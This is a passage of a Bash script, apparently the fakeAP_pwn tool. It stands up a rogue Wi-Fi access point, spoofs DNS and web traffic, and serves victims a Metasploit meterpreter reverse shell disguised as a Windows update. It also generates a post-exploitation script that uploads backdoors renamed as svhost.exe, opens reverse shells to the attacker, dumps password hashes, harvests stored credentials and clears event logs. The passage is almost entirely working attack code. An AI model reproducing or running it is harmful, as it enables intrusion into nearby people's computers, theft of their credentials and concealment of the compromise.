            kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
         fi
         display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
         apMode="non"
      else
         ourIP=$command
      fi
      command=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
      if [ "$command" == "" ] ; then
         display error "Gateway IP Problem. Can't detect the gateway on $interface." $diagnostics 1>&2
         display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
         apMode="non"
         gatewayIP=10.0.0.1 # For DHCP
      else
         gatewayIP=$command
      fi
   fi
else
   gatewayIP=10.0.0.1 # For DHCP
   #ourIP=10.0.0.1 # Not sure if this is right/correct/needed
fi

command=$(ifconfig -a | grep $wifiInterface | awk '{print $1}')
if [ "$command" != "$wifiInterface" ] ; then
   display error "The wireless interface $wifiInterface, isn't correct." $diagnostics 1>&2
   if [ "$debug" == "true" ] ; then iwconfig; fi
   cleanup
fi

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then display action "Stopping services and programs..." $diagnostics ; fi
action "Killing 'Programs'" "killall dhcpd3 apache2 wicd-client airbase-ng hostapd xterm" $verbose $diagnostics "true" $debug # Killing "wicd-client" to prevent channel hopping
action "Killing 'DHCP3 service'" "/etc/init.d/dhcp3-server stop" $verbose $diagnostics "true" $debug
action "Killing 'Apache2 service'" "/etc/init.d/apache2 stop" $verbose $diagnostics "true" $debug
action "Killing 'wicd service'" "/etc/init.d/wicd stop" $verbose $diagnostics "true" $debug # Stopping wicd to prevent channel hopping

#----------------------------------------------------------------------------------------------#
display action "Setting up wireless card..." $diagnostics
if [ "$apType" == "airbase-ng" ] ; then
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" == "$monitorInterface" ] ; then
      action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true" $debug
      sleep 1
   fi
fi
action "Bringing down $wifiInterface" "ifconfig $wifiInterface down" $verbose $diagnostics "true" $debug
sleep 1
action "Bringing up $wifiInterface" "ifconfig $wifiInterface up" $verbose $diagnostics "true" $debug
command=$(ifconfig | grep -q -o  "$wifiInterface")
if [ ! $command == "" ] ; then display error "$wifiInterface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
if [ -n "$command" ] ; then
   action "Killing programs which are using $wifiInterface" "kill $command" $verbose $diagnostics "true" $debug # to prevent interference
fi
if [ "$apType" == "airbase-ng" ] ; then
   action "Monitor Mode (Starting)" "airmon-ng start $wifiInterface" $verbose $diagnostics "true" $debug
   sleep 1
   ifconfig mon0 mtu $mtu                                                             # Changes MTU for FakeAP
   command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
   if [ "$command" != "$monitorInterface" ] ; then
      sleep 5 # Some people need to wait a little bit longer (e.g. VM), some don't. Don't force the ones that don't need it!
      command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
      if [ "$command" != "$monitorInterface" ] ; then
         display error "The monitor interface $monitorInterface, isn't correct." $diagnostics 1>&2
      if [ "$debug" == "true" ] ; then iwconfig; fi
      cleanup
      fi
   fi
fi

if [ "$apType" == "airbase-ng" ] ; then
   command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
   if [ $command ]; then # $interface is WiFi. Therefore two WiFi cards...
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display diag "Testing injection..." $diagnostics ; fi
      command=$(aireplay-ng --test $monitorInterface) #-i ???
      if [ $(echo '$command' | grep "Found 0 APs") ] ; then display error "Couldn't test packet injection" $diagnostics 1>&2;
      elif [ ! $(echo '$command' | grep "Injection is working") ] ; then
         display error "$monitorInterface doesn't support packet injecting." $diagnostics 1>&2
      fi
   fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apType" == "airbase-ng" ] ; then
   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Changing MAC address..." $diagnostics ; fi
      command="ifconfig $monitorInterface down &&"
      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $monitorInterface"; fi
      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $monitorInterface"; fi
      action "Changing MAC Address of FakeAP" "$command && ifconfig $monitorInterface up" $verbose $diagnostics "true" $debug
      sleep 2
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
      macAddress=$(macchanger --show $monitorInterface | awk -F " " '{print $3}')
      macAddressType=$(macchanger --show $monitorInterface | awk -F "Current MAC: " '{print $2}')
      display info "     macAddress=$macAddressType" $diagnostics
   fi
fi

if [ "$apType" == "hostapd" ] ; then
   if [ "$fakeAPmac" == "random" ] || [ "$fakeAPmac" == "set" ] ; then
      if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ] ; then display action "Changing MAC address..." $diagnostics ; fi
      command="ifconfig $wifiInterface down &&"
      if [ "$fakeAPmac" == "random" ] ; then  command="$command macchanger -A $wifiInterface"; fi
      if [ "$fakeAPmac" == "set" ] ; then  command="$command macchanger -m $macAddress $wifiInterface"; fi
      action "Changing MAC Address of FakeAP" "$command && ifconfig $wifiInterface up" $verbose $diagnostics "true" $debug
      sleep 2
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
      macAddress=$(macchanger --show $wifiInterface | awk -F " " '{print $3}')
      macAddressType=$(macchanger --show $wifiInterface | awk -F "Current MAC: " '{print $2}')
      display info "     macAddress=$macAddressType" $diagnostics
   fi
fi

#----------------------------------------------------------------------------------------------#
display action "Creating: Scripts" $diagnostics
if [ "$apMode" != "normal" ] ; then
   if [ -e /tmp/fakeAP_pwn.rb ] ; then rm /tmp/fakeAP_pwn.rb; fi # metasploit script
   echo "# ID: fakeAP_pwn.rb v$version
# Author: g0tmi1k at http://g0tmi1k.blogspot.com

################## Variable Declarations ##################
@client   = client
host,port = session.tunnel_peer.split(':')
os        = @client.sys.config.sysinfo['OS']
host      = @client.sys.config.sysinfo['Computer']
arch      = @client.sys.config.sysinfo['Architecture']
user      = @client.sys.config.getuid
date      = Time.now.strftime(\"%Y-%m-%d.%H:%M:%S\")
uac       = 0

######################## Functions ########################
def doLinux
	print_status(\"Coming soon...\")
end

def doOSX
	print_status(\"Coming soon...\")
end

def doWindows(uac)
	session.response_timeout=120
	begin"> /tmp/fakeAP_pwn.rb
if [ "$payload" == "vnc" ] ; then
   echo "		print_status(\"   Stopping: winvnc.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost101.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"  Uploading: VNC\")
		exec = upload(session,\"$www/winvnc.exe\",\"svhost101.exe\",\"\")
		upload(session,\"$www/vnchooks.dll\",\"vnchooks.dll\",\"\")
		upload(session,\"$www/vnc.reg\",\"vnc.reg\",\"\")
		sleep(1)

		print_status(\"Configuring: VNC\")
		execute(session,\"cmd.exe /C regedit.exe /S %TEMP%\vnc.reg\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		print_status(\"  Executing: winvnc.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -kill -run\", nil)
		sleep(1)

		print_status(\"Configuring: VNC (Reserving connection).\")
		execute(session,\"cmd.exe /C #{exec} -connect 10.0.0.1\", nil)

		print_status(\"   Deleting: Traces\")
		delete(session, \"%SystemDrive%\\\vnc.reg\")" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "sbd" ] ; then
   echo "		print_status(\" Stopping: sbd.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost102.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: SecureBackDoor\")
		exec = upload(session,\"$www/sbd.exe\",\"svhost102.exe\",\"\")
		sleep(1)

		print_status(\"Executing: sbd.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} -q -r 10 -k g0tmi1k -e cmd -p $port 10.0.0.1\", nil)" >> /tmp/fakeAP_pwn.rb
elif [ "$payload" == "wkv" ] ; then
   echo "	print_status(\"  Uploading: Wireless Key Viewer\")
		if @client.sys.config.sysinfo['Architecture'] =~ (/x64/)
			exec = upload(session,\"$www/wkv-x64.exe\",\"\",\"\")
		else
			exec = upload(session,\"$www/wkv-x86.exe\",\"\",\"\")
		end
		sleep(1)

		print_status(\"  Executing: wkv.exe (#{exec})\")
		execute(session,\"cmd.exe /C #{exec} /stabular %TEMP%\\\wkv.txt\", nil)
		sleep(1)

		if uac == 1
			print_status(\"    Waiting: 30 seconds for target to click \\\"yes\\\"\")
			sleep(30)
		end

		# Check for file!
		print_status(\"Downloading: WiFi keys (/tmp/fakeAP_pwn.wkv)\")
		session.fs.file.download_file(\"/tmp/fakeAP_pwn.wkv\", \"%TEMP%\\\wkv.txt\")

		print_status(\"   Deleting: Traces\")
		delete(session, exec)
		delete(session, \"%TEMP%\\\wkv.txt\")" >> /tmp/fakeAP_pwn.rb
else
   echo "		print_status(\"Stopping: backdoor.exe\")
		session.sys.process.execute(\"cmd.exe /C taskkill /IM svhost103.exe /F\", nil, {'Hidden' => true})
		sleep(1)

		print_status(\"Uploading: backdoor.exe ($backdoorPath)\")
		exec = upload(session,\"$backdoorPath\",\"svhost103.exe\",\"\")
		sleep(1)

		print_status(\"Executing: backdoor.exe\")
		execute(session,\"cmd.exe /C #{exec}\", nil)" >> /tmp/fakeAP_pwn.rb
fi
echo "		sleep(1)

	rescue ::Exception => e
		print_status(\"Error: #{e.class} #{e}\")
	end
end

def upload(session,file,filename = \"\",trgloc = \"\")
	if not ::File.exists?(file)
		raise \"File to upload does not exists!\"
	else
		if trgloc == \"\"
			location = session.fs.file.expand_path(\"%TEMP%\")
		else
			location = trgloc
		end
		begin
			if filename == \"\"
				ext = file[file.rindex(\".\") .. -1]
				if ext and ext.downcase == \".exe\"
					fileontrgt = \"#{location}\\\svhost#{rand(100)}.exe\"
				else
					fileontrgt = \"#{location}\\\TMP#{rand(100)}#{ext}\"
				end
			else
				fileontrgt = \"#{location}\\\#{filename}\"
			end
			session.fs.file.upload_file(\"#{fileontrgt}\",\"#{file}\")
		rescue ::Exception => e
			print_status(\"Error uploading file #{file}: #{e.class} #{e}\")
		end
	end
	return fileontrgt
end

def execute(session,cmdexe,opt)
	r=''
	session.response_timeout=120
	begin
		r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => false})
		r.close
	rescue ::Exception => e
		print_status(\"Error Running Command #{cmdexe}: #{e.class} #{e}\")
	end
end

def delete(session, path)
   r = session.sys.process.execute(\"cmd.exe /c del /F /S /Q \" + path, nil, {'Hidden' => 'true'})
   while(r.name)
      select(nil, nil, nil, 0.10)
   end
   r.close
end

def checkUAC(session)
	begin
		open_key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE,\"SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Policies\\\System\", KEY_READ)
		value = open_key.query_value(\"EnableLUA\").data
	rescue ::Exception => e
		print_status(\"Error Checking UAC: #{e.class} #{e}\")
	end
	return (value)
end


########################### Main ##########################
print_line(\"[*] fakeAP_pwn $version\")" >> /tmp/fakeAP_pwn.rb
#if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Date: #{date}\")
print_status(\"  IP: #{host}:#{port}\")
print_status(\"  OS: #{os}\")
if os =~ (/Windows Vista/) || os =~ (/Windows 7/)
	uac = checkUAC(session)
	if uac == 1
		print_error(\" UAC: Enabled\")
		session.core.use(\"priv\")
		#run kitrap0d # x86 ONLY
		#client.execute_script(\"script\",\"args\") #client.execute_script(\"multi_console_command\",[\"-cl\",'help,help\"])
	else
		print_status(\" UAC: Disabled\")
	end
end
print_status(\"Arch: #{arch}\")
print_status(\"Host: #{host}\")
print_status(\"User: #{user}\")
print_status(\"Mode: $payload\")
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
#fi
echo "if os =~ /Linux/
	doLinux
elsif os =~ /OSX/
	doOSX
elsif os =~ /Windows/
#	run getcountermeasure.rb -d
	doWindows(uac)
else
	print_error(\"Unsupported OS\")
	exit
end

print_status(\"Unlocking: fakeAP_pwn\")
output = ::File.open(\"/tmp/fakeAP_pwn.lock\", \"a\")
output.puts(\"fakeAP_pwn\")
output.close
sleep(1)" >> /tmp/fakeAP_pwn.rb
if [ "$extras" == "true" ] ; then
echo "print_status(\"-------------------------------------------\")
print_status(\"Extras\")
screenshot
#----
session.core.use(\"priv\") #use priv
getsystem
hashes = session.priv.sam_hashes  #hashdump #> /tmp/fakeAP_Pwn.hash
####################################################################
   begin
      session.core.use(\"priv\")
      hashes = session.priv.sam_hashes
      print_status(\"Capturing windows hashes ...\")
      File.open(File.join(logs, \"hashes.txt\"), \"w\") do |fd|
         hashes.each do |user|
            fd.puts(user.to_s)
         end
      end
   rescue ::Exception => e
      print_status(\"Error dumping hashes: #{e.class} #{e}\")
   end
####################################################################
#----
sysinfo
ps
ipconfig
route
#enumdesktops
#getdesktop
#setdesktop
#----
run checkvm.rb
run dumplinks.rb -e
run enum_firefox.rb
run enum_logged_on_users.rb -c -l
run enum_putty.rb
run get_application_list.rb
run getcountermeasure.rb -d -k
run get_env.rb
run get_filezilla_creds.rb -c
run get_loggedon_users.rb -c -l
run get_pidgin_creds.rb -b -c -l
run getvncpw.rb
#run killav.rb
run remotewinenum.rb
run scraper.rb
run winenum.rb -r
#----
clearev
print_status(\"-------------------------------------------\")" >> /tmp/fakeAP_pwn.rb
fi
echo "

print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.rb"; fi
   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi
fi

if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi # DHCP script
echo "# fakeAP_pwn.dhcp v$version
ddns-update-style none;
ignore client-updates; # Ignore all client requests for DDNS update
authoritative;
default-lease-time 86400; # 24 hours
max-lease-time 172800; # 48 hours
log-facility local7;

subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.150 10.0.0.250;
  option routers 10.0.0.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 10.0.0.255;
  option domain-name \"Home.com\";
  option domain-name-servers 10.0.0.1;
  option netbios-name-servers 10.0.0.100; 
}" >> /tmp/fakeAP_pwn.dhcp
if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi

if [ "$apMode" != "normal" ] ; then
   if [ -e /etc/apache2/sites-available/fakeAP_pwn ] ; then rm /etc/apache2/sites-available/fakeAP_pwn; fi # Apache (Virtual host)
   echo "# fakeAP_pwn v$version
	<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot $www
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $www>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
	ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <directory \"/usr/lib/cgi-bin\">
                AllowOverride None
                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </directory>
	ErrorLog /var/log/apache2/fakeAP_pwn-error.log
	LogLevel warn
	CustomLog /var/log/apache2/fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
</VirtualHost>
<IfModule mod_ssl.c>
<VirtualHost _default_:443>
	ServerAdmin webmaster@localhost
	DocumentRoot $www
	ServerName \"10.0.0.1\"
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory $www>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>
        <directory \"/usr/lib/cgi-bin\">
                AllowOverride None
                Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </directory>
	ErrorLog /var/log/apache2/error.log
	LogLevel warn
	CustomLog /var/log/apache2/ssl_fakeAP_pwn-access.log combined
        ErrorDocument 403 /index.php
        ErrorDocument 404 /index.php
	SSLEngine on
	SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
	SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
	<FilesMatch \"\.(cgi|shtml|phtml|php)$\">
		SSLOptions +StdEnvVars
	</FilesMatch>
	<Directory /usr/lib/cgi-bin>
		SSLOptions +StdEnvVars
	</Directory>
	BrowserMatch \"MSIE [2-6]\" \
		nokeepalive ssl-unclean-shutdown \
		downgrade-1.0 force-response-1.0
	BrowserMatch \"MSIE [17-9]\" ssl-unclean-shutdown
</VirtualHost>
</IfModule>" > /etc/apache2/sites-available/fakeAP_pwn
   if [ "$verbose" == "2" ]  ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
   if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
fi

if [ "$apMode" != "normal" ] ; then # DNS script
   if [ -e /tmp/fakeAP_pwn.dns ] ; then rm /tmp/fakeAP_pwn.dns; fi
   echo "# fakeAP_pwn.dns v$version
10.0.0.1 *" > /tmp/fakeAP_pwn.dns # dnsspoof
   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dns"; fi
   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
fi

if [ "$apType" == "hostapd" ] ; then # Hostapd config
   if [ -e /tmp/fakeAP_pwn.hostapd ] ; then rm /tmp/fakeAP_pwn.hostapd; fi
   echo "# fakeAP_pwn.hostapd v$version
interface=$apInterface
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
dump_file=/tmp/hostapd.dump
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0
ssid=$ESSID
hw_mode=g
channel=$fakeAPchannel
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
eapol_key_index_workaround=0
eap_server=0
own_ip_addr=127.0.0.1
#wmm_enabled=1
#wmm_ac_bk_cwmin=4
#wmm_ac_bk_cwmax=10
#wmm_ac_bk_aifs=7
#wmm_ac_bk_txop_limit=0
#wmm_ac_bk_acm=0
#wmm_ac_be_aifs=3
#wmm_ac_be_cwmin=4
#wmm_ac_be_cwmax=10
#wmm_ac_be_txop_limit=0
#wmm_ac_be_acm=0
#wmm_ac_vi_aifs=2
#wmm_ac_vi_cwmin=3
#wmm_ac_vi_cwmax=4
#wmm_ac_vi_txop_limit=94
#wmm_ac_vi_acm=0
#wmm_ac_vo_aifs=2
#wmm_ac_vo_cwmin=2
#wmm_ac_vo_cwmax=3
#wmm_ac_vo_txop_limit=47
#wmm_ac_vo_acm=0
#enable_karma=1 # uncomment this line if you patched hostapd with karma
#accept_mac_file=/etc/hostapd/hostapd.accept
#deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
   if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
   if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
fi

#----------------------------------------------------------------------------------------------#
if [ "$apMode" != "normal" ] ; then
   #display action "Creating exploit.(Linux)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"; fi
   #xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $www/kernal_1.83.90-5+lenny2_i386.deb"
   #display action "Creating exploit..(OSX)"
   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"; fi
   #xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $www/SecurityUpdate1-83-90-5.dmg.bin"
   display action "Creating: Exploit (Windows)" $diagnostics
   if [ ! -e $www/sbd.exe ] ; then display error "sbd.exe is not in $www" $diagnostics 1>&2; cleanup; fi
   if [ -e $www/Windows-KB183905-x86-ENU.exe ]; then rm $www/Windows-KB183905-x86-ENU.exe; fi
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
   #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true" $debug
   if [ ! -e $www/Windows-KB183905-x86-ENU.exe ] ; then display error "Failed to created exploit." $diagnostics 1>&2; cleanup; fi
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: Fake access point" $diagnostics
if [ "$apType" == "airbase-ng" ] ; then
   loopMain="False"
   i="1"
   for i in {1..3} ; do # Main Loop
      killall airbase-ng 2>/dev/null # Start fresh...
      sleep 1
      command="airbase-ng -a $macAddress -W 0 -c $fakeAPchannel -e \"$ESSID\"" # taken out y
      #command="airbase-ng -a $macAddress -c $fakeAPchannel -e \"$ESSID\""     # taken out y & W
      #command="airbase-ng -W 0 -c $fakeAPchannel -e \"$ESSID\""               # taken out y & a
      #command="airbase-ng -c $fakeAPchannel -e \"$ESSID\""                    # taken out y & a & W
      if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
      if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
      action "Fake Access Point" "$command $monitorInterface" $verbose $diagnostics "true" $debug 10 0 4& # Dont wait, do the next command
      sleep 3
      ifconfig at0 up                                       # The new FakeAP interface
      command=$(ifconfig -a | grep at0 | awk '{print $1}')
      if [ "$command" != "at0" ] ; then
         display error "Couldn't create the access point's interface." $diagnostics 1>&2
      else
         #if [ "$diagnostics" != "true" ] || [ "$debug" != "true" ]  ; then loopMain="True"; break; fi  # Not in the correct mode
         if [ "$apMode" != "non" ] ; then loopMain="True"; break; fi                 # Not using $interface therefore can't test.
         command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
         if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isnt WiFi, therefore can't test.
         display diag "Attempt #$i to detect the fake access point." $diagnostics
         loopSub="False"
         x="1"
         for x in {1..5} ; do # Sub loop
            display diag "Scanning access point (Scan #$x)" $diagnostics
            testAP $ESSID $interface
            return_val=$?
            if [ "$return_val" -eq "0" ] ; then loopSub="True"; break; # Sub loop
            elif [ "$return_val" -eq "1" ] ; then display error "Coding error" $diagnostics ;
            elif [ "$return_val" -eq "2" ] ; then display error "Couldn't detect a single AP" $diagnostics ;
            elif [ "$return_val" -eq "3" ] ; then display error "Couldn't find the fake AP" $diagnostics ;
            else display error "Unknown error." $diagnostics ; fi
         done # Sub loop
         if [ $loopSub == "True" ] ; then
            display info "Detected the fake access point! ($ESSID)" $diagnostics
            loopMain="True"
            break; # Main Loop
         fi
      fi
      if [ -z "$(pgrep airbase-ng)" ] ; then
         display error "airbase-ng failed to start." $diagnostics 1>&2
         if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
         cleanup
      fi
         sleep 3
         done # Main Loop
      if [ $loopMain == "False" ] ; then
         display error "Couldn't detect the fake access point." $diagnostics 1>&2
         #cleanup
      fi
      elif [ "$apType" == "hostapd" ] ; then
      action "Fake Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" $debug 10 0 4 & # Dont wait, do the next command
      sleep 3
      if [ -z "$(pgrep hostapd)" ] ; then
      display error "hostapd failed to start." $diagnostics 1>&2
      if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
      cleanup
      fi
fi

if [ "$diagnostics" == "true" ] ; then
   sleep 5
   display diag "ping -I $apInterface -c 4 10.0.0.1" $diagnostics
   echo "-Testing Acess point-------------------------------------------------------------------------
$(ping -I $apInterface -c 4 10.0.0.1)" >> fakeAP_pwn.log
fi

#----------------------------------------------------------------------------------------------#
display action "Configuring environment..." $diagnostics
ifconfig lo up
ifconfig $apInterface 10.0.0.1 netmask 255.255.255.0
ifconfig $apInterface mtu $mtu
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush       # Remove existing rules - Start fresh
iptables --delete-chain
iptables --zero
echo 1 > /proc/sys/net/ipv4/ip_forward
command=$(cat /proc/sys/net/ipv4/ip_forward)
if [ $command != "1" ] ; then
  display error "Can't enable ip_forward" $diagnostics 1>&2
  cleanup
fi
if [ "$apMode" == "normal" ] ; then
   iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
   iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
   iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
   #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP #only DNS
   #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP #tcp and udp can be used to transfer dns
   iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP -j DROP # protect our internet gateway
elif [ "$apMode" == "non" ] || [ "$apMode" == "transparent" ] ; then
   #iptables -A INPUT -p udp -i $apInterface --dport 53 -j ACCEPT
   #iptables -A INPUT -p tcp -i $apInterface --dport 53 -j ACCEPT
   #iptables -A INPUT -p tcp -i $apInterface --dport 80 -j ACCEPT
   #iptables -A INPUT -p tcp -i $apInterface --dport 443 -j ACCEPT
   #iptables -A INPUT -p tcp -i $apInterface --dport 4564 -j ACCEPT
   #iptables -A INPUT -p udp -i $apInterface --dport 4564 -j ACCEPT
   #iptables -A INPUT -p tcp -i $apInterface --dport $port -j ACCEPT
   #iptables -A INPUT -p udp -i $apInterface --dport $port -j ACCEPT
   #iptables -A INPUT -i $apInterface -j DROP # drop all other traffic
   iptables --table nat --append PREROUTING --in-interface $apInterface --jump REDIRECT # Blackhole Routing
   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
fi

# DHCP
action "DHCP" "chmod 775 /var/run/" $verbose $diagnostics "true" $debug
action "DHCP" "touch /var/lib/dhcp3/dhcpd.leases" $verbose $diagnostics "true" $debug
if [ -e /etc/apparmor.d/usr.sbin.dhcpd3 ] ; then # ubuntu - Fixes folder persmissions
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]       ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.bkup; fi
   if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn ] ; then rm /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn; fi
   find="\/etc\/dhcpd.conf r,"
   replace="\/etc\/dhcpd.conf r,\n  \/tmp\/fakeAP_pwn.dhcp r,"
   sed "s/$replace/$find/g" /etc/apparmor.d/usr.sbin.dhcpd3 > /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn # Removes any dups
   sed "s/$find/$replace/g" /etc/apparmor.d/usr.sbin.dhcpd3 > /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn
	mv /etc/apparmor.d/usr.sbin.dhcpd3 /etc/apparmor.d/usr.sbin.dhcpd3.bkup
   mv /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn /etc/apparmor.d/usr.sbin.dhcpd3
fi

#----------------------------------------------------------------------------------------------#
display action "Starting: DHCP" $diagnostics
action "DHCP" "dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" $verbose $diagnostics "true" $debug 10 75 5 & # -d = logging, -f = forground # Dont wait, do the next command
sleep 2
